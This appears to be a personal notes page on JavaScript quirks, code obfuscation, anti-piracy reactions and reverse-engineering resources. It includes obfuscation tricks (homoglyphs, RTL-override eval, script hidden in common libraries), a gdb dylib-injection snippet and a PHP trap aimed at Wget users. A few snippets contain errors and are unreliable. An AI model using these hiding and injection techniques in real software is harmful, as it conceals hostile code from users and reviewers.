— ["200" + 0 returns "2000", but "200" - 0 return 200...wtf javascript](https://www.reddit.com/r/javascript/comments/55jh40/200_0_returns_2000_but_200_0_return_200wtf/d8b7b2a)
- `[] + [] === ""`, `String([] + {}) === "[Object object]"`, `{} + [] === 0`, `String(new Array(16)) === ",,,,,,,,,,,,,,,"`

- `[1] + [2] - [3] == 9` - [Why does \[1\] + [2] - [3] = 9 : javascript](https://www.reddit.com/r/javascript/comments/5lmgpz/why_does_1_2_3_9/)
- [What is {} + {} in JavaScript?](http://www.2ality.com/2012/01/object-plus-object.html)
- [You Don't Know JS: Types & Grammar - You-Dont-Know-JS/ch4.md at master · getify/You-Dont-Know-JS](https://github.com/getify/You-Dont-Know-JS/blob/master/types%20%26%20grammar/ch4.md)
- [Arithmetic operators - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Arithmetic_Operators)
- [Equality comparisons and sameness - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness)
- [wtfjs - a little code blog about that language we love despite giving us so much to hate](http://wtfjs.com/)
- [JS Comparison Table](https://dorey.github.io/JavaScript-Equality-Table/)
- [Zeros in JavaScript](http://zero.milosz.ca/)

##### Obfuscation (code)

See [Hacking](#hacking)

Obfuscate code and bytecode

Pirates bypass anti-viruses. Client integrity — prevent client to modify instruction/code. See [Malware](#malware)

- Ajouter du bruit / Injection de code inutile (alourdir volontairement le code pour noyer dans la masse)
	* ajout d'instructions valides inutiles et/ou d'arguments inutiles aux fonctions (pour rendre la lecture du code plus complexe)
	* ajout d'instructions invalides et un saut au-dessus de ces instructions pour dérégler les désassembleurs ne supportant pas ce genre de « protection »
	* Utiliser différents contexts, récursions, remplacement de boucles, conditions et opérations par des version plus complexes (`x/2` -> `x >>> 1`)
	* http://en.wikipedia.org/wiki/Write-only_language
	* [Spaghetti code — Wikipedia](https://en.wikipedia.org/wiki/Spaghetti_code)
- mangle names: identifiants renommés avec des noms sémantiquement muets, avec caractères non affichables ([espace visible ou non](http://en.wikipedia.org/wiki/Space_%28punctuation%29#Spaces_in_Unicode), null char `\x0`, charactères spéciaux `/\"'(){}`) ou nom portant confusion avec l'API native
- `base64(base64(payload))`, `btoa(pako.deflate(root.dca_compressor.utf16to8(JSON.stringify(requests)), {to: "string"}))`
	
	See also:

	* [mikemo » AprilScript: ActionScript worst practices](http://wayback.archive.org/web/20111029080653/http://www.morearty.com/blog/2009/04/01/aprilscript-actionscript-worst-practices/)
	* [How To Write Unmaintainable Code](https://www.thc.org/root/phun/unmaintain.html)
- remove indentation, remove non significative spaces
- remove comments
- [Polymorphic code — Wikipedia](https://en.wikipedia.org/wiki/Polymorphic_code). Different operation give the same output (`1+3 == 6-2`, etc.)
- use different types: string or bits / bytes vs numbers
- intermediate state (use evaluation/decoding step)
	* [ROT13 — Wikipedia](https://en.wikipedia.org/wiki/ROT13), ROT47 - translate charset to an other charset. [Substitution cipher — Wikipedia](https://en.wikipedia.org/wiki/Substitution_cipher)
	* Encoder des informations (clés, bytecode…) dans les fichiers image, audio, etc.: [Hide data](#hide-data)
	* Encoder les informations (clés) dans des chaines courantes "This program cannot be run in DOS mode."
		- [assembly - Is it possible to hide a password defined within C++ code - Stack Overflow](https://stackoverflow.com/questions/5316562/is-it-possible-to-hide-a-password-defined-within-c-code/5316925#5316925)
- Use predictible but unsual / non logical / ambigous operations:
	* instead of boolean, return `String(boolean).charCodeAt(x)`, `func() == y` → `function foo(){(""+boolean)[1] == "r"} foo() == "y"`
	- (languages that support operator overloading) `path / file == path + "/" + file`
	* https://github.com/kitcambridge/evil.js - mess up Javascript native functions (ex. `isNaN()` always return true). See also https://github.com/mathiasbynens/evil.sh
	* use special chars or lookalike chars (confusable homoglyphs):
		- invisible char zero-width chars (U+200B, U+00AD): `window["test"] = "test"`, but `window["te​st"] != "test"`
			`var a = "http://e­x­a­m­p­l­e­.­com", b = "http://example.com"; a != b; a.split(/\s+/).join() == b`
		- http://www.unicode.org/Public/security/latest/confusables.txt see [UTS #39: Unicode Security Mechanisms](http://www.unicode.org/reports/tr39/#confusables)
		- [vhf/confusable_homoglyphs: ϲοｎｆｕѕаｂｌе＿һοｍоɡｌｙｐｈｓ](https://github.com/vhf/confusable_homoglyphs) (use the file provided by Unicode consortium)
		- greek question mark `;` (U+037E) vs. semicolon `;`
		- greek chars `Α, Β, Ε, Ζ, Η, Ι, Κ, Μ, Ν, Ο, Ρ, Τ, Υ, Χ, Ϊ, Ϋ, ο, Ϲ, Ϻ` vs `A, B, E, Z, H, I, K, M, N, O, P, T, Y, X, Ï, Ÿ, o, C, M`
		- Roman Numerals: `ⅰ, ⅴ, ⅹ, ⅼ, ⅽ, ⅾ, ⅿ` vs `i, v, x, l, c, d, m`
		- russia chars (depends fonts & styles): `а, е, и, м, о, о, п, р, р, с, т, у, х` vs `a, e, u, M, o, O, n, P, р, c, m, y, x`
		- diacritics: `é, è, ë, ê, ...` vs `e`. See [Diacritic — Wikipedia](https://en.wikipedia.org/wiki/Diacritic)
		- `﹩` vs `$`
		- `˸` vs `:`
		- ` ` vs `-`: ` 2 != -2`. `(2+ 40) == 42`. ` ` is a white space (Unicode `WSpace` `U+1680 OGHAM SPACE MARK`) See [Hyphen — Wikipedia](https://en.wikipedia.org/wiki/Hyphen#Unicode), [javascript - Why does 2+ 40 equal 42? - Stack Overflow](https://stackoverflow.com/questions/31507143/why-does-2-40-equal-42)
		- with JS implicit type coercion `"-2" == -2`, but `"−2" != -2` (`-` vs `−`)
		-`2*2==4`, but `2✲2==undefined`
		- `𝟣+𝟣` (`SyntaxError: Invalid or unexpected token`/`SyntaxError: illegal character`) `MATHEMATICAL SANS-SERIF DIGIT` [Unicode Characters in the 'Number, Decimal Digit' Category](http://www.fileformat.info/info/unicode/category/Nd/list.htm)
		- https://en.wikipedia.org/wiki/Whitespace_character#Spaces_in_Unicode
		- `'mañana' != 'mañana'; 'ma\xF1ana' != 'man\u0303ana'; 'ma\xF1ana'.length == 6; 'man\u0303ana'.length == 7;` https://mathiasbynens.be/notes/javascript-unicode#accounting-for-lookalikes
		
		Note: all languages / parsers / engines are not compatible
		
		See [Fancy transformation](Text#Fancy transformation)
		
		- https://github.com/reinderien/mimic and https://github.com/reinderien/mimic/wiki/Character-Set
		- [JavaScript variable name validator](https://mothereff.in/js-variables)
		- https://mathiasbynens.be/notes/javascript-identifiers-es6 and https://github.com/mathiasbynens/mothereff.in/tree/master/js-variables and https://stackoverflow.com/questions/1661197/what-characters-are-valid-for-javascript-variable-names
		
	* Use RLO (Right-to-Left Override) or Bidi chars:
	
			(eye="‮rotator")+eval('alert(eye)')   
		
			"‮";(llun=eval)
			"‮";llun(`"‮";alert
			(llun)`)
	
			(a=1) > 0; (א=1) > 0;
	
		- [JS Bin - Collaborative JavaScript Debugging](https://jsbin.com/nihifi/edit?html,output)
		- [JS Bin - Collaborative JavaScript Debugging](https://jsbin.com/heriku/edit?html,output)
		- [Unicode Bidirectional Algorithm basics](https://www.w3.org/International/articles/inline-bidi-markup/uba-basics#mirroring)
	* [Mind your languages - 09-mind-languages.pdf](http://static.sstic.org/rumps2014/09-mind-languages.pdf) and ["Mind Your Languages" - Nouvel article sur l'importance des langages pour la sécurité - ANSSI](http://www.ssi.gouv.fr/fr/anssi/publications/publications-scientifiques/articles-de-conferences/mind-your-languages-nouvel-article-sur-l-importance-des-langages-pour-la.html)
	* [A Collection of JavaScript Gotchas - CodeProject](http://www.codeproject.com/Articles/182416/A-Collection-of-JavaScript-Gotchas)
	* 	eval(unescape(escape`𩁯𨱵𫑥𫡴𛡷𬡩𭁥𨀼𨱡𫡶𨑳𘁩𩀽𠐠𪁥𪑧𪁴🐲𝐰🡠𞱦𫱲𚁑🐶𩐴𞱑𛐭𞱁𛡧𩑴𠱯𫡴𩑸𭁠𜡤𨀮𩡩𫁬𤡥𨱴𚁑𙐳𜀰𛁑𛰳𜀰𛀱𛁉𛰹𜀩𚑦𫱲𚁖👘👑𛰱𜀰𙐳𛐲𛁗👙👑𛰳𩐴𛐱𛁉🐹𜀻𢐭𛐦𙡗𚡗🀹𞱗👚𚱚𚱙𚑚👖𚡗𛁖👖𚡖𛑗𚡗𚱘`.replace(/u../g,''))) // draw mandelbrot with 140 chars
		- [xem on Twitter: "eval(unescape(escape`𩁯𨱵𫑥𫡴𛡷𬡩𭁥𨀼𨱡𫡶𨑳𘁩𩀽𠐠𪁥𪑧𪁴🐲𝐰🡠𞱦𫱲𚁑🐶𩐴𞱑𛐭𞱁𛡧𩑴𠱯𫡴𩑸𭁠𜡤𨀮𩡩𫁬𤡥𨱴𚁑𙐳𜀰𛁑𛰳𜀰𛀱𛁉𛰹𜀩𚑦𫱲𚁖👘👑𛰱𜀰𙐳𛐲𛁗👙👑𛰳𩐴𛐱𛁉🐹𜀻𢐭𛐦𙡗𚡗🀹𞱗👚𚱚𚱙𚑚👖𚡗𛁖👖𚡖𛑗𚡗𚱘`.replace(/u../g,''))) // 140brot https://t.co/GPSFxeYwSD"](https://twitter.com/MaximeEuziere/status/843397121369956354)
	* IEEE 754 Floating-point numbers limitations
		- [particularité de IEEE 754 Floating-point numbers:](https://stackoverflow.com/questions/3730019/why-not-use-double-or-float-to-represent-currency)
		- [`0.1 + 0.2 != 0.3`](https://stackoverflow.com/questions/588004/is-floating-point-math-broken))
		- `0.2 + 0.4 !== 0.6`
		- `9999999999999999 == 10000000000000000`, `9999999999999999 + 2 == 10000000000000002`, `9999999999999999 + 3 == 10000000000000004`, `35.855*100 == 3585.4999999999995`
		- `Math.sin(Math.PI) < Number.EPSILON` `1.2246467991473532e-16 < 2.2204460492503130808472633361816E-16//2 ** -52`
		- `Math.abs(0.2 - 0.3 + 0.1) < Number.EPSILON`
		See `Number.EPSILON`
		- https://github.com/brianleroux/wtfjs/blob/master/posts/2010-02-16-more-floating-point-rounding.md
	* ECMAScript[wtfjs](https://github.com/brianleroux/wtfjs) - contains some posts about ECMAScript specificities
	* ECMAScript date with timezone: `new Date("2016-03-28").getDate() // could returns 27` "New Date(dateString), creates a new date object as ZERO time PLUS the input. You must take timezone-offset into account. If you don't specify a time-zone, the date-object defaults to your browser's time-zone (which might be different from UTC)"
		"Date string is parsed as UTC, then converted to local timezone. So in Boston, new Date("2017-02-28") is Feb 27 2017 19:00:00 GMT-0500 (EST)"
	* ECMAScript bitwise opertations transform 64 bits float to 32 bit integer
		- `~~0.5 == 0`
		[Tilde or the Floor? Practical use for JavaScript bitwise operators. (#1) | rocha.la](http://rocha.la/JavaScript-bitwise-operators-in-practice)
	* ECMAScript null
		`!(null > 0) && !(null == 0) && null >= 0`
		- [Javascript : The Curious Case of Null \>= 0 – Camp Vanilla](https://blog.campvanilla.com/javascript-the-curious-case-of-null-0-7b131644e274)
	* ECMAScript, zeros
		- `-0 === +0`
		- `3 / -0 === -Infinity` (or `Math.pow(-0, -1)`) where `3 / +0 === Infinity` (or `Math.pow(+0, -1)`)
		- http://speakingjs.com/es5/ch11.html#_distinguishing_the_two_zeros
	* ECMAScript, implicit type coercion, see [JSFuck and similar](#jsfuck-and-similar)
	* ECMAScript, rewrite test:
		- `let a = new Number(10); a.valueOf => 20; //-> a == 20; a !== 20; Number.prototype.valueOf.apply(a) === 10 // String(a) == "10" && a.toString() == "10" // typeof a == "object"` primitive can be wrapped by an object
		- `Symbol.hasInstance`, `Symbol.toPrimitive`, `Symbol.toStringTag`: http://www.2ality.com/2015/09/well-known-symbols-es6.html
	* ECMAScript, trailing comma don't add an element: [Trailing commas in JavaScript - Stack Overflow](https://stackoverflow.com/a/11306770/470117)
	* ECMAScript, `var x = NaN; x !== x`
	* ECMAScript: `0[["__proto__"]] === Number.prototype`: [An Abusive Relationship with AngularJS](http://slideshare.net/x00mario/an-abusive-relationship-with-angularjs)
	* Java: 
		- `Integer.valueOf(6) == Integer.valueOf(6)` but `Integer.valueOf(1000) != Integer.valueOf(1000)` (`==` is not `equal()`)
		- `(byte) + (char) - (int) + (long) - 1` (give `1`) (equivalent to `+ - + -1` and `-(-1)`?)
		Explainations: [Some Education While Feeding a Code Troll | Danimo's blog](https://daniel.molkentin.net/2015/02/18/some-education-while-feeding-a-code-troll/)
	* ECMAScript, `(new Date('2012-08-01')).getTime() - (new Date('2012-8-01')).getTime() !== 0`, `(new Date('2012-08-01')).getTime() - (new Date('2012/08/01')).getTime() !== 0`
	* ECMAScript, `this` in a closure or in global refer to `window` (ex.: in event listener) but not in arrow function nor in ES6 module
	* ECMAScript: `parseInt(0.0000008, 10) === 8` but `parseInt("0.0000008", 10) === 0` and `parseFloat(0.0000008, 10) === 8e-7`. Because `String(0.0000008) === 8e-7`. See [Chapter 11. Numbers](http://speakingjs.com/es5/ch11.html#parseInt)
	* ECMAScript, `window["eval"]()`
	* ECMAScript `Number("") === 0` `Number(" ") === 0` `Number("\u00A0") === 0`
	* ECMAScript `"--undefined--".search(undefined) == 0` `"--undefined--".search("undefined") == 2` `"--undefined--".search("a") == -1`
	* ECMAscript, [11 Ways to Invoke a Function](https://gist.github.com/myshov/05800f083a0afce56e0f782314a103eb)
	* ECMAScript, `[Function("console.log(this)")][0]()` `this` is the array itself. `const arr = [function(){return this === arr}]; arr[0]();// true` It's a method call (JS quirk of Array elements being properties). `arr` is an object, `0` is a method name, `this` is bound to arr
	* ECMAScript `var \u{61};` (valid in ES6)
	* ECMAScript `let n1 = 123,456,789;// 789`
	* ECMAScript `12 === 0xC === 0b1100 === 9+3`
	* ECMAScript [commas operators](http://speakingjs.com/es5/ch09.html#comma_operator).
		`var x = 0; var y = (x++, 10); x == 1 && y == 10;` can be written `var x = 0, y = (x++, 10);`
		`[].concat[1,2,3];` will return `[1,2,3]` if you do `Array.prototype.concat[3] = [1,2,3];` first.
		Other example: `({baz: "a"})["foo","bar","baz"]` is the same as `({baz: "a"})["baz"]`
		
		- http://www.2ality.com/2016/11/concat-array-literal.html
	* ECMAScript `void 4+7 === (void 4)+7`, `void 4+7 !== void (4+7)` http://speakingjs.com/es5/ch09.html#void_operator
	* ECMAScript: `["10", "10", "10"].map(parseInt) // [10, NaN, 2]`
		Because in `array.map(callback)`, the `callback` receive [3 parameters (`currentValue`, `index`, `array`)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map#Parameters).
		And `parseInt()` accept [2 parameters (`string`, `radix`)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt#Parameters)
		
		Use `["10", "10", "10"].map(value => parseInt(value))` instead
	* ECMAScript: `Array.prototype.push("test"); let empty = []; empty.length === 0; empty[0] === "test"; Array.prototype[0] === "test"` `Array.isArray(Array.prototype))` same as `Object.prototype.foo = "bar"; let empty = {}; empty.foo === "bar"`
	* ECMAScript proxy: https://github.com/mathiasbynens/tpyo `const array = tpyo(['a', 'b', 'c']);array.lnegth;array.tosTr1ng();`
	* ECMAScript regexp previous match:
	
			"abc".match(/b/);
			console.log(RegExp["$`"]);// a
			console.log(RegExp["$&"]);// b
			console.log(RegExp["$'"]);// c
			console.log("abc".replace("b", "$`"));// aac
			console.log("abc".replace("b", "$&"));// abc
			console.log("abc".re:place("b", "$'"));// acc
	* ECMAScript string template
	
			alert`1`				// no parenthesis needed
			Function`alert\`1\````	// escaped back-ticks
			!{[alert`1`]:null}		// back-tick & computed
			+{valueOf() alert`1`}	// method shorthand
			`hello`-alert`1`-`goodbye`	// concatenation
			`hello${alert(1)}goodbye`	// expression interpolation
	* ECMAScript:
	
			let x = (() => {
				for (var i = 0; i < 5; i++) {
					try { return i; }
					finally { if (i != 3) continue; }
				}
			})();
			console.log( x ); // -> 3
		
		- [c# - Why can't a 'continue' statement be inside a 'finally' block? - Stack Overflow](https://stackoverflow.com/questions/17991036/why-cant-a-continue-statement-be-inside-a-finally-block)
	* Esoteric programming language that are subset of a language 
		see [JSFuck](#esoteric-programming-languages)
	* closures
	* enumerable
	* write or switch Object prototype
	* ECMAScript (and other language support) destructuring `[a, b] = [b, a]`
	* ECMAScript: redefined global variable, like undefined:
		- (≤ ES4) `undefined = "a"; typeof undefined != "undefined"`
		- in using function parameter `(function(undefined = "a") {typeof undefined != "undefined"})();`
		- `with({undefined: 1}){1 === undefined}`
		- `(() => {var undefined = 1; return 1 === undefined;})()`
		
		To resolve it, just use: `var trueUndefined = (function(undefined) {return undefined})();` or `var trueUndefined = void(0);`
	* PHP, copy array instead of using it reference. See [Is there a function to make a copy of a PHP array to another? - Stack Overflow](https://stackoverflow.com/questions/1532618/is-there-a-function-to-make-a-copy-of-a-php-array-to-another/1532632#1532632)
	* JS: [DOM clobbering](#dom-clobbering)
	* CSS: escaped char can be followed by space `.\65 lement{}` is same as `.element{}` but not `.e lement{}` (spaces are often used to combine selectors) [Using character escapes in markup and CSS](https://www.w3.org/International/questions/qa-escapes#cssescapes)
	* C, `#define true false`, `#define if(x) if((rand % 10) ? (x) : !(x))`, `#define if(x) if((x) && ( ((double)rand()*10.0 / (double)RAND_MAX) < 1.0))`
	* PHP `$func = 'foo';$func();// This calls foo()`: [PHP: Variable functions - Manual](http://php.net/manual/en/functions.variable-functions.php)
	* HTML: `<a href="#">Link</a href="#">` where the tag name is `a href="#"` where space is EN QUAD (U+2000) [#HTMLQuiz](http://html5te.st/quiz/)
	* This code is valid for both PHP and Java: https://gist.github.com/forairan/b1143f42883b3b0ee1237bc9bd0b7b2c
	* Math phenomens:
		- `1/99980001 = 1/Math.pow(9999, 2) = 0.00000001000200030004000500060007…9994999599969997999900000001000200030004…` (but without 9998)
		- `1/998001 = 1/Math.pow(999, 2) = 0.000001002003004005006007…994995996997999000001002003004…` (but without 998)
		- `1/9801 = 1/Math.pow(99, 2) = 0.000102030405…9697990001020304…` (sequence from 00 to 99, but without 98)
		- `1/81 = 1/Math.pow(9, 2) = 012345679/999999999 = 0.0123456790123456790123…` (without 8)
		
		`Math.floor(Math.pow(10, 1 + x)/81) % 10 == x// but doesn't works for all x (x=8 gives 9, x=9 gives 0, x=10 gives 1, etc.)`
		See [998,001 and its Mysterious Recurring Decimals - Numberphile - YouTube](https://www.youtube.com/watch?v=daro6K6mym8&feature=youtu.be&app=desktop)
		
			12345679*9 = 111111111
		
			1*8+1=9
			12*8+2=98
			123*8+3=987
			1234*8+4=9876
			12345*8+5=98765
			123456*8+6=987654
			1234567*8+7=9876543
			12345678*8+8=98765432
			123456789*8+9=987654321
			1234567890*8+0=9876543210
		
	* C `main(){printf(&unix["\021%six\012\0"], (unix)["have"]+"fun"-0x60);}` print `unix` when compiled on unix [`main(){printf(&unix\["\021%six\012\0"\], (unix)["have"]+"fun"-0x60);}` - faehnri.ch](http://faehnri.ch/have-fun/)
	* Auto expand, in HTML `<table><td></td></table>` is parsed as `<HTML><HEAD></HEAD><BODY><TABLE><TBODY><TR><TD></TD></TR></TBODY></TABLE></BODY></HTML>`. See also HTML5 with non closed tags
	* HTML head and its children are not display by default, but can be `head,meta,title,link,script,style,base{display: block !important;min-width: 50px;min-height: 20px;overflow: visible;}`
	* Retro compatibility of ECMAScript RegExps [The madness of parsing real world JavaScript regexps](https://hackernoon.com/the-madness-of-parsing-real-world-javascript-regexps-d9ee336df983#.pm1rfh4zy)
	* ActionScript
	
			package {
				import flash.display.*
				import flash.text.*
				
				public class AprilFools extends Sprite {
					エイプリルフール var Number = 4..toString()
			
					use namespace エイプリルフール
			
					function AprilFools()
					{
						get = set
						set = get
				
						with (createTextField())
						text = new Date(Number).toDateString()
					}
			
					function get get() { return Number + <><{Number}
						b={"/"+Number.split(/\//)[0]*502.25}/>..@b }
					function set get(set) { Number = set+'/'+set/4 }
			
					function get set() { return Number }
					function set set(get) { Number = get }
			
					// nothing fun here
					function createTextField():TextField
					{
						stage.scaleMode = StageScaleMode.NO_SCALE;
						stage.align = StageAlign.TOP_LEFT;
						var textField:TextField = new TextField();
						textField.width = 1000;
						addChild(textField);
						return textField;
					}
				}
			}
			
			namespace エイプリルフール

		- [mikemo » AprilScript: ActionScript worst practices](http://wayback.archive.org/web/20111029080653/http://www.morearty.com/blog/2009/04/01/aprilscript-actionscript-worst-practices/)
	- Python: [Obfuscating "Hello world!" – Ben Kurtovic](https://benkurtovic.com/2014/06/01/obfuscating-hello-world.html)
	- SQL: [SQL obfuscation](http://wayback.archive.org/web/20120203032738/http://sla.ckers.org/forum/read.php?24,35405)
- Hide you script in commonly used lib (ex: jQuery add special method or option)
- Centraliser le moins possible de méthodes ou objets
- encrypt the program if it's possible, like DRM, but require a full capable and trusted chain (end-to-end)
- remote execution : a part of the program is downloaded at each launch
	* Rendre le moins prévisible le fonctionnement (différentes méthodes, instructions provenant du server). Version de façon unique et "jettable" (méthodes et algorithmes différents)
- Control Flow obfuscation / Dynamic Code wrapping / Statement-Level Randomization
- simple:
	compress (deflate) + XOR with a key `This obfuscation is intended to discourage XXXX from making modifications to the YYYY. We know this 'encryption' is easily broken.`
	
	- [Orange: \[Bug Bounty\] GitHub Enterprise SQL Injection](http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html)
	- [decrypt obfuscated GitHub Enterprise .rb files](https://gist.github.com/geoff-codes/02d1e45912253e9ac183)
- Some good advices [How To Write Unmaintainable Code](https://github.com/Droogans/unmaintainable-code)
- SWF obfuscation
	See [SWF obfuscation](SWF#Obfuscation)
- [Gamasutra: Mary Min's Blog - Six Strategies for Protecting Your Mobile Games Against Hackers, Crackers & Copycatters](http://www.gamasutra.com/blogs/MaryMin/20150610/245625/Six_Strategies_for_Protecting_Your_Mobile_Games_Against_Hackers_Crackers__Copycatters.php)
- [Tricherie, piratage, vol de données… Bienvenue dans les jeux Facebook | Roxane](http://www.roxane-company.com/blog/2014/06/05/tricherie-piratage-vols-de-donn%C3%A9es-bienvenue-sur-les-jeux-facebook/)
- [Unbundling Pokémon Go — Applidium](https://applidium.com/en/news/unbundling_pokemon_go/)

See also:

- [ProGuard](http://proguard.sourceforge.net/) (obfuscation for Java)
- [Jscrambler | Make Your JavaScript Application Protect Itself](https://jscrambler.com/fr/) - Commercial solution for JavaScript
- [Obfuscation (software) - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Obfuscation_(software))
- [Previous IOCCC Winners](http://www.ioccc.org/years.html) and [Spoiler summary](http://www.ioccc.org/all/summary.txt)
- [Dissecting a spammer's spam script – Our Technical Narrative](https://jelleraaijmakers.nl/2016/04/dissecting-spammers-spam-script)
- [PHP Code Deobfuscator](https://github.com/technopagan/php-code-deobfuscator) use `ltrace -e memcpy`
- [Cheat Engine :: View topic - [Library] Gamehacking Tools](http://forum.cheatengine.org/viewtopic.php?t=309234)
- [web-obfuscation - Web Application Obfuscation - Google Project Hosting](https://code.google.com/p/web-obfuscation/)
- [hackme: Deconstructing an ELF File](http://manoharvanga.com/hackme/)
- [How I Cracked a Keylogger and Ended Up in Someone's Inbox](https://www.trustwave.com/Resources/SpiderLabs-Blog/How-I-Cracked-a-Keylogger-and-Ended-Up-in-Someone-s-Inbox/)
	.Net keylogger cracked, reveal attacker's email credentials (but all email are forwarded to an other account)

### Reaction to violation

And recover, hijacking, pirated, hacked

> giving the attackers feedback that he has been identified helps him find your protection mechanism

- Wait adequate moment to act (ex.: let people play and cheat several days, and ban all detected players)
- offer them a discount to buy a copy
- (game) enclose cheaters in a "parallel world of cheaters" where they can play without disturbing non cheaters players (matchmaking): (multiplayer games) play togethers, (games with ranked score) cheated ranks only viewable by cheaters themself (but still see non cheated ranks)
- (game) make the game really harder or impossible: set invisibility to (random) enemies, add visual glitches, unpredictable/inaccurate interactions (less precise click and keys), trap the player in the scenario
- [Logic bomb — Wikipedia](https://en.wikipedia.org/wiki/Logic_bomb)
- [Video Game Cheaters Outed By Logic Bombs - Slashdot](https://games.slashdot.org/story/16/02/02/1732254/video-game-cheaters-outed-by-logic-bombs)
- [Eight of the Most Hilarious Anti-Piracy Measures in Video Games - IGN](http://www.ign.com/articles/2013/04/29/eight-of-the-most-hilarious-anti-piracy-measures-in-video-games)
- [12 hilarious, brutally devious ways game developers punish pirates | PCWorld](http://www.pcworld.com/article/2602876/software-games/10-hilarious-brutally-devious-ways-pc-game-developers-punish-pirates.html)
- "cyber-blurring": create fake email accounts, complete with phony documents, to confuse the attackers. "false accounts, with false content, as traps" (forged phishing emails)
	- [Hackers Came, but the French Were Prepared - The New York Times](https://www.nytimes.com/2017/05/09/world/europe/hackers-came-but-the-french-were-prepared.html)
	- [Macron hackers linked to Russian-affiliated group behind US attack | World news | The Guardian](https://www.theguardian.com/world/2017/may/08/macron-hackers-linked-to-russian-affiliated-group-behind-us-attack)
 
	<?php
	// Wget troll
	if(!empty($_SERVER['HTTP_USER_AGENT']) && preg_match('/Wget/', $_SERVER['HTTP_USER_AGENT'])){
		header('Location: ftp://speedtest.tele2.net/1000GB.zip', true, 302);
	}

#### Recover compromised account

**Always check settings.** Ex: check if emails are not redirected (to catch bank informations, etc.)

- [Que faire si votre compte mail est piraté ?](http://lecollectif.orange.fr/articles/faire-compte-mail-pirate/)

#### Recover compromised website

**Verify before restore if the backup is not affected too.**

- [Are You Prepared Against A Hack? – Smashing Magazine](https://www.smashingmagazine.com/2014/05/are-you-prepared-against-a-hack/)
- [What to do if your WordPress site is hacked- OVH](https://www.ovh.co.uk/g1874.what_to_do_if_your_wordpress_site_is_hacked)

#### Recover compromised server

- [hacking - How do I deal with a compromised server? - Server Fault](http://serverfault.com/questions/218005/how-do-i-deal-with-a-compromised-server)
- [Steps for Recovering from a UNIX or NT System Compromise](http://www.cert.org/historical/tech_tips/win-UNIX-system_compromise.cfm)

### Hacking

See [Prevent violation](#prevent-violation)

	# mach injection hack
	# From https://github.com/mschrag/slowmo
	cat <<EOM | gdb -quiet > /dev/null
	attach $SIM_PID
	p (void *)dlopen("$(cd "$(dirname "$0")"; pwd)/mach.bin", 2)
	detach
	EOM
	# Then start targeted app

	sudo fs_usage -w -f filesys | grep "file_used.ext"

- [Cracking Sublime Text 3](http://blog.fernandodominguez.me/cracking-sublime-text-3/)
- [A collection of resources for linux reverse engineering](https://github.com/michalmalik/linux-re-101)
- [How to Crack Just About Any Mac App (and How to Prevent It)](http://lifehacker.com/5736101/how-to-crack-just-about-any-mac-app-and-how-to-prevent-it)
- [Hopper](https://www.hopperapp.com/)
- [Mobile Security Wiki](https://mobilesecuritywiki.com/) - see https://github.com/exploitprotocol/mobile-security-wiki
- [Reverse engineering](http://en.wikipedia.org/wiki/Reverse_engineering)
- [Programming Linux Anti-Reversing Techniques by Jacob Baines \[PDF/iPad/Kindle\]](https://leanpub.com/anti-reverse-engineering-linux) (see [the PDF](anti-reverse-engineering-linux.pdf)) https://github.com/antire-book/dont_panic
- [IDA](https://www.hex-rays.com/products/ida/)
- [Linux_Anti_Debug.pdf](Linux_Anti_Debug.pdf)
- [Eldad_Eilam-Reversing__Secrets_of_Reverse_Engineering-Wiley(2005).pdf](Eldad_Eilam-Reversing__Secrets_of_Reverse_Engineering-Wiley(2005).pdf)
- [anti-reverse-engineering-linux.pdf](anti-reverse-engineering-linux.pdf)
- [How to Reverse Engineer OS X and iOS Software](https://davidwalsh.name/reverse-engineer-os-ios-software)
- [OS X and iOS Reverse Engineering: How to Reverse Engineer an iOS App](https://www.apriorit.com/dev-blog/363-how-to-reverse-engineer-os-x-and-ios-software)
- [Software Reverse Engineering Tools](https://www.apriorit.com/dev-blog/366-software-reverse-engineering-tools)
- [Reverse-engineering Instagram to access the private API](http://blog.will3942.com/reverse-engineering-instagram) - By modify Instagram Android App APK
- [REC Decompiler Home Page](http://www.backerstreet.com/rec/rec.htm) - Tool to reverse compilation. Recognises "signature" assembly code that compilers generate for program structures such as conditionals (if, else, switch) and loops (for, do, while) and generates C like code
- [Reverse Engineering Linux x86 Binaries](http://althing.cs.dartmouth.edu/local/reverse-talk.pdf)
- [Frida • A world-class dynamic instrumentation framework - Inject JavaScript to explore native apps on Windows, macOS, Linux, iOS, Android, and QNX](https://www.frida.re/) - See [Frida, la nouvelle amie des reversers et hackers - virtualabs.fr](http://www.virtualabs.fr/Frida-la-nouvelle-amie-des)
- [Reversing d’applications Android - virtualabs.fr](http://www.virtualabs.fr/Reversing-d-applications-Android)
- [How to recover lost Python source code if it's still resident in-memory](https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12)
- [SpiderMonkey | Didier Stevens](https://blog.didierstevens.com/programs/spidermonkey/) - Use a modified ECMAScript engine to desofuscate code
- [Digital Whisper :: עמוד הגליונות](http://www.digitalwhisper.co.il/Issues/) - Resource in Hebrew, but with code chunks and captures
- anti-debugger protection - [Anti Reverse Engineering Protection Techniques to Use Before Releasing Software](https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software)
- ECMAScript: Object in can be used as scalar values (called [primite values](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Primitive_values)) via the [`Object#valueOf()` method](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf): `let randomNumber = {valueOf(){return Math.random(), toString(){return Math.random()}}}; randomNumber + 1;// 1.3751036170372646 <- random value`. See also [`Symbol.toPrimitive`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/toPrimitive): `let randomNumber = {[Symbol.toPrimitive](hint){return Math.random()}}`
- [Hooked on Mnemonics Worked for Me: A Primer on Cracking XOR Encoded Executables](http://hooked-on-mnemonics.blogspot.fr/2017/04/a-primer-on-cracking-xor-encoded.html)
- [FlexiSpy hack](https://pastebin.com/raw/Y1yf8kq0)
- [RE guide for beginners: Methodology and tools - Reverse Engineering - 0x00sec](https://0x00sec.org/t/re-guide-for-beginners-methodology-and-tools/2242)
